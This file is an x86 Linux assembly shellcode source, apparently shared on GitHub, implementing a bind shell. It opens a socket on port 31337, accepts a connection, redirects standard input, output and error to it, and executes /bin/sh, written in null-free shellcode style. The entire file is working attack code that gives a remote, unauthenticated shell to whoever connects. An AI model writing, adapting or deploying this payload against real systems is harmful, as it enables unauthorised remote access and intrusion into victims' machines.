/*
 * bind shell
 * github: A1phaZer0
 */

.intel_syntax noprefix
.section .text
.global _start

_start:
    /* 
     * create socket
     * socket(PF_INET, SOCK_STREAM, 0);
     */
    xor eax, eax
    push eax        /* protocol = 0 */
    inc eax
    push eax        /* SOCK_STREAM == 1 */
    inc eax
    push eax        /* PF_INET == 2 */
    mov ecx, esp
    xor ebx, ebx    
    inc ebx         /* SYS_SOCKET */
    mov al, 0x66
    int 0x80        /* sys_socketall() */

    /* 
     * bind socket 
     * bind(sockfd, (struct sockaddr *)host, sizeof(struct sockaddr));
     */
    mov esi, eax    /* store sockfd to esi */
    xor eax, eax
    push eax        /* sin_addr 0.0.0.0 for any */
    mov ax, 0x697A  /* order switched 31337(0x7a69) */ 
    push ax         /* sin_port */
    xor eax, eax
    mov al, 0x2
    push ax         /* AF_INET only used by host so no network byte order */
    mov ebx, esp    /* sockaddr_in pointer */
    mov al, 0x10    /* length */
    push eax        
    push ebx        
    push esi        
    mov ecx, esp    /* args */
    xor ebx,ebx
    mov bl, 0x2     /* SYS_BIND */
    mov al, 0x66    /* sys_sockteall() */
    int 0x80

    /* 
     * listen port 
     * listen(sockfd, 2);
     */
    xor eax, eax
    mov al, 0x2
    push eax	    
    push esi	    /* sockfd */
    mov ecx, esp
    mov bl, 0x4	    /* SYS_LISTEN */
    mov al, 0x66    /* sys_socketall() */
    int 0x80

    /* 
     * accept connection 
     * new_sockfd = accept(sockfd, NULL, NULL);
     */
    xor eax, eax
    push eax
    push eax
    push esi
    mov ecx, esp
    mov bl, 0x5     /* SYS_ACCEPT */
    mov al, 0x66
    int 0x80

    /* 
     * file descriptor duplication 
     * dup2(old, new);
     */
    mov ebx, eax    /* new_sockfd */
    xor eax, eax
    xor edx, edx
    xor ecx, ecx
    mov cl, 0x3
LOOP:
    dec ecx
    mov al, 0x3f    /* sys_dup2 */
    int 0x80
    cmp ecx, edx
    jnz LOOP        /* loop 3 times */

    /* execve("/bin/sh", NULL, NULL); */
    xor eax, eax
    push eax	    /* \x00 */
    push 0x68732f2f /* "//sh" */
    push 0x6e69622f /* "/bin" */
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80



